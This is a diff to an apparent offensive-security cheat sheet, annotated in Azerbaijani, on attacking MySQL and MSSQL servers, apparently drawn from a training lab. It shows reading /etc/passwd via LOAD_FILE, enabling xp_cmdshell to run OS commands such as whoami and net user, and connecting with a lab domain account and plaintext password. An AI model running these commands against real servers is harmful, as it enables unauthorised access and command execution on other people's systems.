@@ -133,6 +133,16 @@ mysql -u root -p -h target -e "SELECT LOAD_FILE('/etc/passwd');"
 
 
 ## MSSQL
+```
+# Qoşulma üsulları
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+# Linuxdan
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+```
 
 ```bash
 # Basic MSSQL detection & version
@@ -206,6 +216,7 @@ EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
 # Lokal Server üzərindən 
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+enable_xp_cmdshell
 EXEC xp_cmdshell 'whoami';
 EXEC xp_cmdshell 'net user';
 EXEC xp_readerrorlog;
